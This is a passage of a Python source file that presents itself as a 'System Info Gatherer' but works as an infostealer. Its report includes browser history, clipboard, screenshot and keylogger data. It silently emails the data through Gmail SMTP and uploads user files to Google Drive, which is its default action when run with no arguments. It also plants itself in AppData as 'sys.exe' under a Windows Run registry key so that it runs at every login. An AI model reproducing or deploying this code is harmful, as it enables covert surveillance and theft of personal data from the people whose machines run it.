            lines.append(f"  Driver:  {gpu.get('driver_version', 'N/A')}")
        
        # Motherboard
        mb = data.get('motherboard_info', {})
        lines.append("\n--- MOTHERBOARD INFO ---")
        lines.append(f"  Manufacturer:  {mb.get('manufacturer', 'N/A')}")
        lines.append(f"  Product:       {mb.get('product', 'N/A')}")
        lines.append(f"  Serial:        {mb.get('serial_number', 'N/A')}")
        
        # BIOS
        bios = data.get('bios_info', {})
        lines.append("\n--- BIOS INFO ---")
        lines.append(f"  Manufacturer:  {bios.get('manufacturer', 'N/A')}")
        lines.append(f"  Version:       {bios.get('version', 'N/A')}")
        
        # Uptime
        uptime = data.get('system_uptime', {})
        lines.append("\n--- SYSTEM UPTIME ---")
        lines.append(f"  Boot Time:     {uptime.get('boot_time', 'N/A')}")
        lines.append(f"  Uptime:        {uptime.get('uptime', 'N/A')}")
        
        # Installed software / services / startup
        installed = data.get('installed_software', [])
        services = data.get('running_services', [])
        startup = data.get('startup_programs', [])
        lines.append("\n--- ADDITIONAL SYSTEM INFO ---")
        lines.append(f"  Installed software count: {len(installed)}")
        lines.append(f"  Running services count:   {len(services)}")
        lines.append(f"  Startup programs count:   {len(startup)}")
        lines.append(f"  Browser history entries: {sum(len(v) for v in data.get('browser_history', {}).values() if isinstance(v, list))}")
        lines.append(f"  Clipboard types: {', '.join(data.get('clipboard_info', {}).get('clipboard_types', [])) or 'None'}")
        lines.append(f"  Screenshots found: {data.get('screenshot_info', {}).get('count', 0)}")
        lines.append(f"  Keylogger lines: {data.get('keylogger_info', {}).get('line_count', 0)}")
        lines.append(f"  Active connections: {len(data.get('net_info', {}).get('active_connections', []))}")
        lines.append("  Full system details are attached as JSON and TXT files.")

        # Network Summary
        network = data.get('network_info', {})
        io = network.get('io_counters', {})
        lines.append("\n--- NETWORK IO ---")
        lines.append(f"  Bytes Sent:    {io.get('bytes_sent', 0) / (1024**2):.2f} MB")
        lines.append(f"  Bytes Recv:    {io.get('bytes_recv', 0) / (1024**2):.2f} MB")
        
        lines.append("\n" + "=" * 60)
        lines.append("  END OF REPORT")
        lines.append("=" * 60)
        
        return "\n".join(lines)
    
    def send_email(self, data, recipient=EMAIL_TO):
        """Send system information via email with JSON attachment"""
        try:
            if not GMAIL_APP_PASSWORD:
                print("\n[ERROR] Gmail app password is not configured.")
                print("Set GMAIL_APP_PASSWORD as an environment variable before sending email.")
                return False

            # Create the email message with both HTML and plain-text bodies plus attachments
            msg = MIMEMultipart('mixed')
            msg['From'] = EMAIL_FROM
            msg['To'] = recipient
            hostname = data.get('basic_info', {}).get('system', {}).get('hostname', 'Unknown')
            msg['Subject'] = f"System Info Report - {hostname} - {data.get('timestamp', 'N/A')}"

            body_text = self.format_info_for_email(data)
            body_html = self.format_info_for_email_html(data)

            alternative_part = MIMEMultipart('alternative')
            alternative_part.attach(MIMEText(body_text, 'plain', 'utf-8'))
            alternative_part.attach(MIMEText(body_html, 'html', 'utf-8'))
            msg.attach(alternative_part)

            # Attach the full JSON data as a file
            json_data = json.dumps(data, indent=4, default=str)
            json_attachment = MIMEApplication(json_data.encode('utf-8'), _subtype='json')
            timestamp = dt.now().strftime('%Y%m%d_%H%M%S')
            json_attachment.add_header(
                'Content-Disposition',
                f'attachment; filename="system_info_{hostname}_{timestamp}.json"'
            )
            msg.attach(json_attachment)

            # Attach the readable text report as a file
            text_attachment = MIMEText(body_text, 'plain', 'utf-8')
            text_attachment.add_header(
                'Content-Disposition',
                f'attachment; filename="system_info_{hostname}_{timestamp}.txt"'
            )
            msg.attach(text_attachment)
            
            # Send via Gmail SMTP
            print(f"Connecting to Gmail SMTP server...")
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.ehlo()
                server.starttls()
                server.ehlo()
                server.login(EMAIL_FROM, GMAIL_APP_PASSWORD)
                server.send_message(msg)
            
            print(f"Email sent successfully to {recipient}!")
            return True
            
        except smtplib.SMTPAuthenticationError:
            print("\n[ERROR] Gmail authentication failed!")
            print("Make sure you have:")
            print("  1. Enabled 2-Step Verification on your Google Account")
            print("  2. Generated an App Password at:")
            print("     https://myaccount.google.com/apppasswords")
            print("  3. Set the GMAIL_APP_PASSWORD environment variable or")
            print("     updated the GMAIL_APP_PASSWORD variable in this script")
            return False
        except Exception as e:
            print(f"\n[ERROR] Failed to send email: {e}")
            return False
    
    def display_summary(self):
        """Display a summary of system information"""
        info = self.get_basic_system_info()
        cpu = self.get_cpu_info()
        mem = self.get_memory_info()
        
        print("\n" + "=" * 60)
        print("  SYSTEM INFORMATION SUMMARY")
        print("=" * 60)
        
        print(f"\n  Hostname:     {info['system']['hostname']}")
        print(f"  Platform:     {info['system']['platform']} {info['system']['platform_release']}")
        print(f"  Architecture: {info['system']['architecture']}")
        print(f"  Processor:    {info['system']['processor']}")
        print(f"  IP Address:   {info['system']['ip_address']}")
        print(f"  Boot Time:    {info['boot_time']}")
        
        print(f"\n  CPU:")
        print(f"    Name:       {cpu.get('name', 'N/A')}")
        print(f"    Cores:      {cpu['physical_cores']} physical, {cpu['total_cores']} logical")
        print(f"    Usage:      {cpu['total_usage']}%")
        
        print(f"\n  Memory:")
        print(f"    Total:      {mem['total'] / (1024**3):.2f} GB")
        print(f"    Used:       {mem['used'] / (1024**3):.2f} GB ({mem['percentage']}%)")
        print(f"    Available:  {mem['available'] / (1024**3):.2f} GB")
        
        print("=" * 60)


def auto_send():
    """Automatically gather all system info, save reports, upload to Drive, and send via email."""
    print("\n[*] Gathering system information...")
    gatherer = SystemInfoGatherer()
    all_info = gatherer.get_all_system_info()
    
    print("[*] Saving report files locally...")
    json_file, txt_file = gatherer.save_report_files(all_info)
    files_to_upload = [p for p in (json_file, txt_file) if p]

    user_files = gatherer.get_files_to_upload()
    if user_files:
        files_to_upload.extend(user_files)
        print(f"[*] Discovered {len(user_files)} user files for Drive upload.")
    else:
        print("[*] No user files found for Drive upload.")

    folder_id = GOOGLE_DRIVE_FOLDER_ID or gatherer._extract_drive_folder_id(GOOGLE_DRIVE_FOLDER_LINK)
    if folder_id and files_to_upload:
        print("[*] Uploading files to Google Drive...")
        folder_name = f"SystemInfoUpload_{dt.now().strftime('%Y%m%d_%H%M%S')}"
        gatherer.upload_files_to_drive(files_to_upload, folder_id=folder_id, folder_name=folder_name)
    else:
        print("[*] Google Drive upload skipped because folder ID is not configured or no files were available.")

    if GMAIL_APP_PASSWORD:
        print(f"[*] Sending email to {EMAIL_TO}...")
        gatherer.send_email(all_info)
    else:
        print("[*] Email sending skipped because GMAIL_APP_PASSWORD is not configured.")


def main():
    """Main function to run the system info gatherer"""
    gatherer = SystemInfoGatherer()
    
    while True:
        print("\nSystem Information Gatherer")
        print("1. Display system summary")
        print("2. Get CPU info")
        print("3. Get memory info")
        print("4. Get disk info")
        print("5. Get network info")
        print("6. Get GPU info")
        print("7. Get motherboard info")
        print("8. Get BIOS info")
        print("9. Get installed software")
        print("10. Get running services")
        print("11. Get startup programs")
        print("12. Get system uptime")
        print("13. Get all info & save to file")
        print("14. Get all info & send to email")
        print("15. Exit")
        
        choice = input("Enter your choice (1-15): ")
        
        if choice == '1':
            gatherer.display_summary()
        elif choice == '2':
            cpu = gatherer.get_cpu_info()
            print(json.dumps(cpu, indent=2, default=str))
        elif choice == '3':
            mem = gatherer.get_memory_info()
            print(json.dumps(mem, indent=2, default=str))
        elif choice == '4':
            disks = gatherer.get_disk_info()
            for disk in disks:
                print(f"\n  {disk['device']} ({disk['mountpoint']})")
                print(f"    Type:  {disk['file_system_type']}")
                print(f"    Total: {disk['total_size'] / (1024**3):.2f} GB")
                print(f"    Used:  {disk['used'] / (1024**3):.2f} GB ({disk['percentage']}%)")
                print(f"    Free:  {disk['free'] / (1024**3):.2f} GB")
        elif choice == '5':
            network = gatherer.get_network_info()
            print(json.dumps(network, indent=2, default=str))
        elif choice == '6':
            gpus = gatherer.get_gpu_info()
            for gpu in gpus:
                print(f"\n  {gpu['name']}")
                print(f"    RAM:     {gpu.get('adapter_ram', 'N/A')}")
                print(f"    Driver:  {gpu.get('driver_version', 'N/A')}")
        elif choice == '7':
            mb = gatherer.get_motherboard_info()
            print(json.dumps(mb, indent=2, default=str))
        elif choice == '8':
            bios = gatherer.get_bios_info()
            print(json.dumps(bios, indent=2, default=str))
        elif choice == '9':
            print("Fetching installed software (this may take a while)...")
            software = gatherer.get_installed_software()
            for sw in software:
                print(f"  {sw['name']} v{sw.get('version', 'N/A')} ({sw.get('vendor', 'N/A')})")
        elif choice == '10':
            services = gatherer.get_running_services()
            print(f"\nRunning services ({len(services)}):")
            for svc in services:
                print(f"  {svc['display_name']} [{svc['start_mode']}]")
        elif choice == '11':
            startup = gatherer.get_startup_programs()
            print(f"\nStartup programs ({len(startup)}):")
            for prog in startup:
                print(f"  {prog['name']}: {prog['command']}")
        elif choice == '12':
            uptime = gatherer.get_system_uptime()
            print(f"\n  Boot time: {uptime['boot_time']}")
            print(f"  Uptime:    {uptime['uptime']}")
        elif choice == '13':
            print("Gathering all system information...")
            all_info = gatherer.get_all_system_info()
            json_file, txt_file = gatherer.save_report_files(all_info)
            if json_file and txt_file:
                print(f"Saved report files: {json_file}, {txt_file}")
                folder_id = GOOGLE_DRIVE_FOLDER_ID or gatherer._extract_drive_folder_id(GOOGLE_DRIVE_FOLDER_LINK)
                if folder_id:
                    print("Uploading saved report files to Google Drive...")
                    gatherer.upload_reports_to_drive([json_file, txt_file], folder_id)
                else:
                    print("Google Drive upload skipped because folder ID is not configured.")
        elif choice == '14':
            print("Gathering all system information...")
            all_info = gatherer.get_all_system_info()
            json_file, txt_file = gatherer.save_report_files(all_info)
            if json_file and txt_file:
                print(f"Saved report files: {json_file}, {txt_file}")
                folder_id = GOOGLE_DRIVE_FOLDER_ID or gatherer._extract_drive_folder_id(GOOGLE_DRIVE_FOLDER_LINK)
                if folder_id:
                    print("Uploading saved report files to Google Drive...")
                    gatherer.upload_reports_to_drive([json_file, txt_file], folder_id)
                else:
                    print("Google Drive upload skipped because folder ID is not configured.")
            print(f"Sending email to {EMAIL_TO}...")
            gatherer.send_email(all_info)
        elif choice == '15':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")


def install_to_startup():
    """Install the exe to run at Windows startup via Registry"""
    import winreg
    import shutil
    
    try:
        # Get the path of the current executable
        if getattr(sys, 'frozen', False):
            # Running as compiled exe
            exe_path = sys.executable
        else:
            # Running as script
            exe_path = os.path.abspath(__file__)
        
        # Copy to a persistent location in AppData
        app_dir = os.path.join(os.environ.get('APPDATA', ''), 'SystemInfoService')
        os.makedirs(app_dir, exist_ok=True)
        
        exe_name = "sys.exe" if getattr(sys, 'frozen', False) else "sysinfo.py"
        dest_path = os.path.join(app_dir, exe_name)
        
        if os.path.abspath(exe_path) != os.path.abspath(dest_path):
            shutil.copy2(exe_path, dest_path)
            print(f"[+] Copied to: {dest_path}")
        
        # Build the startup command
        if getattr(sys, 'frozen', False):
            startup_cmd = f'"{dest_path}" --auto'
        else:
            startup_cmd = f'pythonw "{dest_path}" --auto'
        
        # Add to Windows Registry Run key
        reg_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(reg_key, "SystemInfoService", 0, winreg.REG_SZ, startup_cmd)
        winreg.CloseKey(reg_key)
        
        print("[+] Successfully installed to Windows startup!")
        print(f"[+] Registry entry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemInfoService")
        print(f"[+] Command: {startup_cmd}")
        print("[+] The system info will be collected and emailed on every login.")
        return True
        
    except Exception as e:
        print(f"[-] Failed to install to startup: {e}")
        return False


def uninstall_from_startup():
    """Remove from Windows startup"""
    import winreg
    import shutil
    
    try:
        # Remove registry entry
        reg_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        try:
            winreg.DeleteValue(reg_key, "SystemInfoService")
            print("[+] Removed from Windows startup registry.")
        except FileNotFoundError:
            print("[*] Registry entry not found (already removed).")
        winreg.CloseKey(reg_key)
        
        # Remove installed files
        app_dir = os.path.join(os.environ.get('APPDATA', ''), 'SystemInfoService')
        if os.path.exists(app_dir):
            shutil.rmtree(app_dir)
            print(f"[+] Removed installed files from: {app_dir}")
        
        print("[+] Uninstall complete.")
        return True
        
    except Exception as e:
        print(f"[-] Failed to uninstall: {e}")
        return False


if __name__ == "__main__":
    
    if len(sys.argv) > 1:
        flag = sys.argv[1].lower()
        
        if flag in ('--auto', '--report', '--send-report'):
            # Silent mode: gather info, save a report, upload to Drive, and send email
            auto_send()
        elif flag == '--menu' or flag == '--interactive':
            main()
        elif flag == '--install':
            # Install to Windows startup
            install_to_startup()
        elif flag == '--uninstall':
            # Remove from Windows startup
            uninstall_from_startup()
        elif flag == '--help':
            print("System Info Gatherer - Usage:")
            print("  sys.exe                  Automatically gather info and deliver reports")
            print("  sys.exe --menu           Run the interactive menu")
            print("  sys.exe --auto           Gather info, save report, upload to Drive, and send email silently")
            print("  sys.exe --report         Same as --auto")
            print("  sys.exe --install        Install to Windows startup")
            print("  sys.exe --uninstall      Remove from Windows startup")
            print("  sys.exe --help           Show this help message")
        else:
            print(f"Unknown flag: {flag}")
            print("Use --help to see available options.")
    else:
        auto_send()